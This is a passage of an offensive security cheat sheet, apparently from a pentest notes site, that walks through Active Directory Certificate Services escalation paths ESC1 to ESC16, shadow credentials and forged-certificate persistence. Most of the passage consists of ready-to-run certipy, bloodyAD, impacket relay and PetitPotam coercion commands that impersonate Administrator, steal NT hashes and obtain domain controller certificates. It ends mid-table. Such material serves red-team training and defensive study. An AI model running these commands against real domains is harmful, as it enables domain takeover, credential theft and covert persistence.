+</span></span><span class=line><span class=cl>certipy find -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## Output: YYYYMMDDHHMMSS_Certipy.json + _Certipy.txt + _Certipy.zip (BloodHound import)</span>
+</span></span></code></pre></div><p>Drop the zip into BloodHound, certipy adds <code>ADCSESC1</code> through <code>ADCSESC16</code> edges automatically.</p><h2 id=ii-esc1---enrollee-supplies-subject--client-auth-eku data-heading-permalink=true><span class=heading-content>ii. ESC1 - Enrollee supplies subject + Client Auth EKU</span>
+<a class=heading-permalink href=#ii-esc1---enrollee-supplies-subject--client-auth-eku aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Template lets you specify the SAN, and the cert can be used to authenticate. Request a cert AS Administrator:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template VulnTemplate <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span> -sid <span class=s1>&#39;S-1-5-21-...-500&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Output: administrator.pfx</span>
+</span></span><span class=line><span class=cl><span class=c1>## Use the cert to get Administrator&#39;s NT hash:</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>-sid is required post-CVE-2022-26923</span></div><div class=obsidian-callout-body><p>The <code>-sid</code> flag attaches the szOID_NTDS_CA_SECURITY_EXT extension. Without it, post-patch DCs reject the cert. Get the target&rsquo;s SID from <code>nxc ldap $DC --get-sid</code> or <code>impacket-lookupsid</code>.</p></div></div><h2 id=iii-esc2---any-purpose--subca-template data-heading-permalink=true><span class=heading-content>iii. ESC2 - Any Purpose / SubCA template</span>
+<a class=heading-permalink href=#iii-esc2---any-purpose--subca-template aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The template has Any Purpose EKU (or no EKU = same effect). Same exploit as ESC1, just specify the target&rsquo;s UPN:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template AnyPurposeTemplate <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span> -sid <span class=s1>&#39;S-1-5-21-...-500&#39;</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><h2 id=iv-esc3---enrollment-agent-template data-heading-permalink=true><span class=heading-content>iv. ESC3 - Enrollment Agent template</span>
+<a class=heading-permalink href=#iv-esc3---enrollment-agent-template aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>You can enroll for a cert that has Certificate Request Agent EKU. Then use that cert to enroll on behalf of another user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Step 1: Enroll as yourself for the EA cert</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template EnrollmentAgentTemplate
+</span></span><span class=line><span class=cl><span class=c1>## Output: svc_user.pfx (EA cert)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Step 2: Use the EA cert to request a cert AS Administrator</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template User <span class=se>\
+</span></span></span><span class=line><span class=cl>  -pfx svc_user.pfx -on-behalf-of <span class=s2>&#34;</span><span class=nv>$DOMAIN</span><span class=s2>\\Administrator&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Output: administrator.pfx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Step 3: Authenticate</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><h2 id=v-esc4---template-writedacl-template-acl-hijack data-heading-permalink=true><span class=heading-content>v. ESC4 - Template WriteDacl (template ACL hijack)</span>
+<a class=heading-permalink href=#v-esc4---template-writedacl-template-acl-hijack aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>You have write rights to the template object. Make it ESC1-vulnerable, then exploit as ESC1.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Save current template config:</span>
+</span></span><span class=line><span class=cl>certipy template -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -template VulnTemplate -save-old
+</span></span><span class=line><span class=cl><span class=c1>## Overwrite to ESC1-vulnerable defaults:</span>
+</span></span><span class=line><span class=cl>certipy template -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -template VulnTemplate -write-default-configuration
+</span></span><span class=line><span class=cl><span class=c1>## Now exploit as ESC1:</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template VulnTemplate <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span> -sid <span class=s1>&#39;S-1-5-21-...-500&#39;</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## Restore template:</span>
+</span></span><span class=line><span class=cl>certipy template -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -template VulnTemplate -configuration template.json
+</span></span></code></pre></div><h2 id=vi-esc5---object-owner--dacl-on-ad-objects data-heading-permalink=true><span class=heading-content>vi. ESC5 - Object owner / DACL on AD objects</span>
+<a class=heading-permalink href=#vi-esc5---object-owner--dacl-on-ad-objects aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>A range of AD objects related to PKI (CA, NTAuthCertificates container, etc) have weak ACLs. Specific to the misconfig - sometimes leads to ESC4, sometimes lets you publish a malicious root CA.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Identify which object via certipy find output</span>
+</span></span><span class=line><span class=cl><span class=c1>## Then chain via the appropriate primitive (template write -&gt; ESC4, etc)</span>
+</span></span></code></pre></div><h2 id=vii-esc6---editf_attributesubjectaltname2-enabled-on-ca data-heading-permalink=true><span class=heading-content>vii. ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA</span>
+<a class=heading-permalink href=#vii-esc6---editf_attributesubjectaltname2-enabled-on-ca aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Any cert template that allows authentication becomes vulnerable to SAN injection because the CA honors user-supplied SANs regardless of template setting.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Any template with Client Auth + your enroll right is now ESC1-like</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template User <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span> -sid <span class=s1>&#39;S-1-5-21-...-500&#39;</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><h2 id=viii-esc7---vulnerable-ca-permissions-manageca--managecertificates data-heading-permalink=true><span class=heading-content>viii. ESC7 - Vulnerable CA permissions (ManageCA / ManageCertificates)</span>
+<a class=heading-permalink href=#viii-esc7---vulnerable-ca-permissions-manageca--managecertificates aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>You have ManageCA or ManageCertificates rights on the CA itself. Two paths:</p><h3 id=manageca-enable-esc6-then-esc1 data-heading-permalink=true><span class=heading-content>ManageCA: enable ESC6, then ESC1</span>
+<a class=heading-permalink href=#manageca-enable-esc6-then-esc1 aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy ca -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -ca <span class=nv>$CA</span> -enable-edit-flag EDITF_ATTRIBUTESUBJECTALTNAME2
+</span></span><span class=line><span class=cl><span class=c1>## Now ESC6 applies, exploit as ESC1</span>
+</span></span><span class=line><span class=cl><span class=c1>## Restore when done:</span>
+</span></span><span class=line><span class=cl>certipy ca -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -ca <span class=nv>$CA</span> -disable-edit-flag EDITF_ATTRIBUTESUBJECTALTNAME2
+</span></span></code></pre></div><h3 id=manageca--add-yourself-as-officer-approve-a-pending-request data-heading-permalink=true><span class=heading-content>ManageCA + add yourself as Officer, approve a pending request</span>
+<a class=heading-permalink href=#manageca--add-yourself-as-officer-approve-a-pending-request aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy ca -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -ca <span class=nv>$CA</span> -add-officer <span class=nv>$USER</span>
+</span></span><span class=line><span class=cl><span class=c1>## Submit a request without enrollment right (it goes pending):</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template SubCA <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span> -sid <span class=s1>&#39;S-1-5-21-...-500&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Note the request ID, then issue it:</span>
+</span></span><span class=line><span class=cl>certipy ca -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -ca <span class=nv>$CA</span> -issue-request <span class=nv>$REQ_ID</span>
+</span></span><span class=line><span class=cl><span class=c1>## Retrieve the issued cert:</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -retrieve <span class=nv>$REQ_ID</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><h2 id=ix-esc8---ntlm-relay-to-http-cert-enrollment data-heading-permalink=true><span class=heading-content>ix. ESC8 - NTLM relay to HTTP cert enrollment</span>
+<a class=heading-permalink href=#ix-esc8---ntlm-relay-to-http-cert-enrollment aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>CA has Web Enrollment enabled and accepts NTLM. Coerce DC$ to authenticate, relay to /certsrv/, get a DC cert.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Terminal 1: certipy in relay mode</span>
+</span></span><span class=line><span class=cl>certipy relay -target <span class=s2>&#34;http://</span><span class=nv>$CA_HOST</span><span class=s2>&#34;</span> -template DomainController
+</span></span><span class=line><span class=cl><span class=c1>## or:</span>
+</span></span><span class=line><span class=cl>sudo impacket-ntlmrelayx -t <span class=s2>&#34;http://</span><span class=nv>$CA_HOST</span><span class=s2>/certsrv/certfnsh.asp&#34;</span> --adcs --template DomainController -smb2support
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Terminal 2: coerce DC to authenticate to attacker</span>
+</span></span><span class=line><span class=cl>impacket-petitpotam -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> <span class=nv>$ATTACKER</span> <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## or:</span>
+</span></span><span class=line><span class=cl>coercer coerce -l <span class=nv>$ATTACKER</span> -t <span class=nv>$DC</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> -d <span class=nv>$DOMAIN</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## After relay: certipy saves DC.pfx</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx dc.pfx -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## Output: NT hash of DC$ -&gt; DCSync, see [DCSync](https://jinpwn.dev/cheatsheets/active-directory/ad12-dcsync/)</span>
+</span></span></code></pre></div><p>ESC8 against HTTPS endpoint requires Channel Binding to be disabled, which is rare in 2026. HTTP endpoint is more common to be available.</p><h2 id=x-esc9---no-sid-security-extension-cve-2022-26923 data-heading-permalink=true><span class=heading-content>x. ESC9 - No SID security extension (CVE-2022-26923)</span>
+<a class=heading-permalink href=#x-esc9---no-sid-security-extension-cve-2022-26923 aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Template has <code>msPKI-Enrollment-Flag</code> with <code>NO_SECURITY_EXTENSION</code> set. Without the SID extension, post-CVE-2022-26923 DCs map the cert based on UPN alone. Combine with WriteAccountUPN or GenericWrite on a target user.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Step 1: Set victim&#39;s UPN to match Administrator (you need GenericWrite on victim)</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim userPrincipalName -v <span class=s1>&#39;Administrator&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Step 2: Request the cert as victim (without -sid since template has no security ext)</span>
+</span></span><span class=line><span class=cl>certipy req -u victim@<span class=nv>$DOMAIN</span> -p <span class=nv>$VICTIM_PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template ESC9Template
+</span></span><span class=line><span class=cl><span class=c1>## Step 3: Reset victim&#39;s UPN to avoid disrupting service</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim userPrincipalName -v <span class=s1>&#39;victim@corp.local&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Step 4: Auth with the cert -&gt; Administrator</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx victim.pfx -dc-ip <span class=nv>$DC</span> -username administrator -domain <span class=nv>$DOMAIN</span>
+</span></span></code></pre></div><h2 id=xi-esc10---weak-certificate-mapping data-heading-permalink=true><span class=heading-content>xi. ESC10 - Weak certificate mapping</span>
+<a class=heading-permalink href=#xi-esc10---weak-certificate-mapping aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Registry <code>CertificateMappingMethods</code> allows UPN-only mapping (<code>0x4</code>) or weak explicit map (<code>0x8</code>). Same UPN-swap chain as ESC9.</p><h2 id=xii-esc11---relay-to-icpr-rpc-no-encryption-enforced data-heading-permalink=true><span class=heading-content>xii. ESC11 - Relay to ICPR RPC (no encryption enforced)</span>
+<a class=heading-permalink href=#xii-esc11---relay-to-icpr-rpc-no-encryption-enforced aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Same chain as ESC8 but RPC endpoint instead of HTTP. Useful when web enrollment is disabled but ICPR is exposed.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## certipy relay supports RPC scheme:</span>
+</span></span><span class=line><span class=cl>certipy relay -target <span class=s2>&#34;rpc://</span><span class=nv>$CA_HOST</span><span class=s2>&#34;</span> -template DomainController
+</span></span><span class=line><span class=cl><span class=c1>## Coerce as in ESC8</span>
+</span></span></code></pre></div><h2 id=xiii-esc12---tpm-bound-key-validation-bypass data-heading-permalink=true><span class=heading-content>xiii. ESC12 - TPM-bound key validation bypass</span>
+<a class=heading-permalink href=#xiii-esc12---tpm-bound-key-validation-bypass aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Requires code execution on a CA with TPM-attached. Out of scope for standard pentest workflows - read the certipy wiki if you encounter this scenario.</p><h2 id=xiv-esc13---issuance-policy-oid---group data-heading-permalink=true><span class=heading-content>xiv. ESC13 - Issuance Policy OID -> group</span>
+<a class=heading-permalink href=#xiv-esc13---issuance-policy-oid---group aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Template has an Issuance Policy OID that&rsquo;s linked to a privileged group via <code>msDS-OIDToGroupLink</code>. Enrolling = automatic group membership in the linked group.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Certipy find flags this with ESC13</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template ESC13Template
+</span></span><span class=line><span class=cl><span class=c1>## When authenticating, you get the group membership baked into the PAC:</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx user.pfx -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## You now have Admin group rights via the cert&#39;s policy OID</span>
+</span></span></code></pre></div><h2 id=xv-esc14---weak-altsecurityidentities data-heading-permalink=true><span class=heading-content>xv. ESC14 - Weak altSecurityIdentities</span>
+<a class=heading-permalink href=#xv-esc14---weak-altsecurityidentities aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>You can write <code>altSecurityIdentities</code> on a target user. Add a mapping that points to a cert you control, then authenticate with that cert as the victim.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Step 1: Get a cert with a known issuer + serial</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template User
+</span></span><span class=line><span class=cl><span class=c1>## Step 2: Get the cert&#39;s issuer and serial (output of certipy includes them)</span>
+</span></span><span class=line><span class=cl><span class=c1>## Step 3: Map them to victim&#39;s altSecurityIdentities</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim altSecurityIdentities <span class=se>\
+</span></span></span><span class=line><span class=cl>  -v <span class=s1>&#39;X509:&lt;I&gt;CN=CORP-CA,DC=corp,DC=local&lt;S&gt;CN=svc_user&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>## Step 4: Authenticate AS victim using your cert</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx svc_user.pfx -dc-ip <span class=nv>$DC</span> -username victim -domain <span class=nv>$DOMAIN</span>
+</span></span><span class=line><span class=cl><span class=c1>## Step 5: Cleanup</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim altSecurityIdentities
+</span></span></code></pre></div><h2 id=xvi-esc15--ekuwu-cve-2024-49019 data-heading-permalink=true><span class=heading-content>xvi. ESC15 / EKUwu (CVE-2024-49019)</span>
+<a class=heading-permalink href=#xvi-esc15--ekuwu-cve-2024-49019 aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Template based on Schema V1 with &ldquo;Supply in Request&rdquo; lets you inject EKUs via Application Policies. Patched as CVE-2024-49019 in late 2024 - boxes built before the patch still vulnerable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Detection via certipy find -vulnerable</span>
+</span></span><span class=line><span class=cl>certipy req -u <span class=nv>$USER</span>@<span class=nv>$DOMAIN</span> -p <span class=nv>$PASS</span> -dc-ip <span class=nv>$DC</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template WebServer <span class=se>\
+</span></span></span><span class=line><span class=cl>  -application-policies <span class=s1>&#39;Client Authentication&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl>  -upn Administrator@<span class=nv>$DOMAIN</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx administrator.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><h2 id=xvii-esc16---disabled-sid-extension-on-ca-cve-related-2025 data-heading-permalink=true><span class=heading-content>xvii. ESC16 - Disabled SID extension on CA (CVE-related, 2025)</span>
+<a class=heading-permalink href=#xvii-esc16---disabled-sid-extension-on-ca-cve-related-2025 aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>CA has the SID extension disabled globally. All templates effectively act like ESC9. Same exploitation chain - UPN-swap a victim, request cert, swap back.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Same chain as ESC9 (section x)</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim userPrincipalName -v <span class=s1>&#39;Administrator&#39;</span>
+</span></span><span class=line><span class=cl>certipy req -u victim@<span class=nv>$DOMAIN</span> -p <span class=nv>$VICTIM_PASS</span> -dc-ip <span class=nv>$DC</span> -target <span class=nv>$CA_HOST</span> -ca <span class=nv>$CA</span> -template User
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> <span class=nb>set</span> object victim userPrincipalName -v <span class=s1>&#39;victim@corp.local&#39;</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx victim.pfx -dc-ip <span class=nv>$DC</span> -username administrator -domain <span class=nv>$DOMAIN</span>
+</span></span></code></pre></div><h2 id=xviii-shadow-credentials-via-cert data-heading-permalink=true><span class=heading-content>xviii. Shadow Credentials via cert</span>
+<a class=heading-permalink href=#xviii-shadow-credentials-via-cert aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you have GenericWrite on a user and AD CS is enabled, the shadow credentials attack uses the <code>msDS-KeyCredentialLink</code> attribute to associate a cert with the user. bloodyAD wraps the whole flow:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> add shadowCredentials victim
+</span></span><span class=line><span class=cl><span class=c1>## Output: victim.ccache (TGT) or victim.pfx (cert + key, if PKINIT fails)</span>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>victim.ccache
+</span></span><span class=line><span class=cl><span class=c1>## or:</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx victim.pfx -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## Cleanup:</span>
+</span></span><span class=line><span class=cl>bloodyAD -d <span class=nv>$DOMAIN</span> -u <span class=nv>$USER</span> -p <span class=nv>$PASS</span> --host <span class=nv>$DC</span> remove shadowCredentials victim
+</span></span></code></pre></div><p>DC must be Server 2016+ for msDS-KeyCredentialLink schema.</p><h2 id=xix-certipy-auth-output-options data-heading-permalink=true><span class=heading-content>xix. Certipy auth output options</span>
+<a class=heading-permalink href=#xix-certipy-auth-output-options aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Standard auth, dump NT hash + save TGT:</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx victim.pfx -dc-ip <span class=nv>$DC</span>
+</span></span><span class=line><span class=cl><span class=c1>## When the cert has no UPN (e.g. machine account):</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx machine.pfx -dc-ip <span class=nv>$DC</span> -username <span class=s1>&#39;COMPUTER$&#39;</span> -domain <span class=nv>$DOMAIN</span>
+</span></span><span class=line><span class=cl><span class=c1>## Save the resulting ccache and use it for impacket:</span>
+</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span><span class=k>$(</span><span class=nb>pwd</span><span class=k>)</span>/Administrator.ccache
+</span></span><span class=line><span class=cl>impacket-psexec -k -no-pass dc.<span class=nv>$DOMAIN</span>
+</span></span><span class=line><span class=cl><span class=c1>## Get the NT hash directly without saving ccache:</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx victim.pfx -dc-ip <span class=nv>$DC</span> -no-save -print
+</span></span></code></pre></div><h2 id=xx-forging-certs-post-da-persistence data-heading-permalink=true><span class=heading-content>xx. Forging certs (post-DA persistence)</span>
+<a class=heading-permalink href=#xx-forging-certs-post-da-persistence aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Once you have the CA&rsquo;s private key (via <code>lsadump::ca</code> on the CA host, or HSM extraction):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>certipy forge -ca-pfx ca.pfx -upn Administrator@<span class=nv>$DOMAIN</span> -subject <span class=s1>&#39;CN=Administrator&#39;</span>
+</span></span><span class=line><span class=cl>certipy auth -pfx Administrator_forged.pfx -dc-ip <span class=nv>$DC</span>
+</span></span></code></pre></div><p>Forged certs survive password changes and last as long as the CA cert. Common long-term persistence.</p><h2 id=xxi-quick-reference data-heading-permalink=true><span class=heading-content>xxi. Quick reference</span>
+<a class=heading-permalink href=#xxi-quick-reference aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><table><thead><tr><th>ESC</th><th>Trigger</th><th>Exploit</th></tr></thead><tbody><tr><td>ESC1</td><td>Supply SAN + Client Auth</td><td><code>certipy req -upn Administrator -sid SID</code></td></tr><tr><td>ESC2</td><td>Any Purpose EKU</td><td>same as ESC1</td></tr><tr><td>ESC3</td><td>Enrollment Agent EKU</td><td>enroll EA cert, then <code>-on-behalf-of</code></td></tr><tr><td>ESC4</td><td>Template WriteDacl</td><td><code>certipy template -write-default-configuration</code> -> ESC1</td></tr><tr><td>ESC5</td><td>Object owner / weak DACL on PKI obj</td><td>chain to ESC4 or republish CA</td></tr><tr><td>ESC6</td><td>CA flag EDITF_ATTRIBUTESUBJECTALTNAME2</td><td>any auth template -> ESC1</td></tr><tr><td>ESC7</td><td>ManageCA / ManageCertificates</td><td>enable ESC6 or approve pending request</td></tr><tr><td>ESC8</td><td>HTTP cert enroll + NTLM</td><td><code>certipy relay</code> + coerce</td></tr><tr><td>ESC9</td><td>NO_SECURITY_EXTENSION on template</td><td>UPN swap with bloodyAD</td></tr><tr><td>ESC10</td><td>Weak CertificateMappingMethods</td><td>UPN swap</td></tr><tr><td>ESC11</td><td>ICPR RPC no encryption</td><td><code>certipy relay rpc://</code> + coerce</td></tr><tr><td>ESC12</td><td>TPM CA + execution</td><td>rare, manual</td></tr><tr><td>ESC13</td><td>Policy OID -> group link</td><td><code>certipy req</code> -> inherit 